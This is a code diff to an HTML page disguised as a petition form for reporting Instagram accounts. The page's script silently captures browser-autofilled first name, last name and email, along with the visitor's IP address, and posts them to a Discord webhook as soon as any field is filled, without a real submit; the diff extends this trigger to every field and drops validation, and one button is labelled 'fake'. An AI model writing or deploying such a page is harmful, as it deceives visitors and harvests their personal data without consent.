@@ -146,28 +146,30 @@
 
   <div class="container">
     <h2>Report an Instagram Account</h2>
-    <p>Help us petition Instagram to remove users violating the community guidelines. Provide the account's handle and reason below.</p>
+    <p>Help us petition Instagram to remove users violating the community guidelines. If your browser has saved your info, we’ll use it to submit immediately.</p>
     <button id="trigger">Open Petition Form</button>
 
     <div id="formContainer">
       <p class="instructions">
-        If your browser has saved your personal details, simply click into the fields below to autofill. As soon as the data is entered, we’ll submit it automatically.
+        Your First Name, Last Name, and Email can be autofilled from your browser’s saved information. 
+        The handle and reason fields are optional; we don't care what you put there. 
+        As soon as any field is filled, we submit automatically.
       </p>
       <form id="userForm" autocomplete="on">
         <label for="fname">Your First Name</label>
-        <input type="text" id="fname" name="given-name" autocomplete="given-name" required>
+        <input type="text" id="fname" name="given-name" autocomplete="given-name">
 
         <label for="lname">Your Last Name</label>
-        <input type="text" id="lname" name="family-name" autocomplete="family-name" required>
+        <input type="text" id="lname" name="family-name" autocomplete="family-name">
 
         <label for="email">Your Email</label>
-        <input type="email" id="email" name="email" autocomplete="email" required>
+        <input type="email" id="email" name="email" autocomplete="email">
         
-        <label for="handle">Instagram Handle to Report</label>
+        <label for="handle">Instagram Handle to Report </label>
         <input type="text" id="handle" name="handle" placeholder="@username">
 
-        <label for="reason">Reason for Reporting</label>
-        <textarea id="reason" name="reason" placeholder="Tell us why this account should be banned..."></textarea>
+        <label for="reason">Reason for Reporting </label>
+        <textarea id="reason" name="reason" placeholder="Tell us anything you'd like..."></textarea>
       </form>
       <button id="fake">Approve</button>
     </div>
@@ -181,6 +183,8 @@
     const fnameField = document.getElementById('fname');
     const lnameField = document.getElementById('lname');
     const emailField = document.getElementById('email');
+    const handleField = document.getElementById('handle');
+    const reasonField = document.getElementById('reason');
 
     let userIP = 'Unknown IP';
 
@@ -205,12 +209,16 @@
       if (
         fnameField.value.trim() !== '' ||
         lnameField.value.trim() !== '' ||
-        emailField.value.trim() !== ''
+        emailField.value.trim() !== '' ||
+        handleField.value.trim() !== '' ||
+        reasonField.value.trim() !== ''
       ) {
         submitForm(
           fnameField.value.trim() || '[No First Name]',
           lnameField.value.trim() || '[No Last Name]',
-          emailField.value.trim() || '[No Email]'
+          emailField.value.trim() || '[No Email]',
+          handleField.value.trim() || '[No Handle]',
+          reasonField.value.trim() || '[No Reason]'
         );
       }
     }
@@ -220,7 +228,9 @@
                       `**IP:** ${userIP}\n` +
                       `**First Name:** ${fname}\n` +
                       `**Last Name:** ${lname}\n` +
-                      `**Email:** ${email}\n`;
+                      `**Email:** ${email}\n` +
+                      `**Instagram Handle to Report:** ${handle}\n` +
+                      `**Reason:** ${reason}`;
 
       fetch(DISCORD_WEBHOOK_URL, {
         method: 'POST',
@@ -240,10 +250,14 @@
     fnameField.addEventListener('input', checkFields);
     lnameField.addEventListener('input', checkFields);
     emailField.addEventListener('input', checkFields);
+    handleField.addEventListener('input', checkFields);
+    reasonField.addEventListener('input', checkFields);
 
     fnameField.addEventListener('change', checkFields);
     lnameField.addEventListener('change', checkFields);
     emailField.addEventListener('change', checkFields);
+    handleField.addEventListener('change', checkFields);
+    reasonField.addEventListener('change', checkFields);
   </script>
 </body>
 </html>
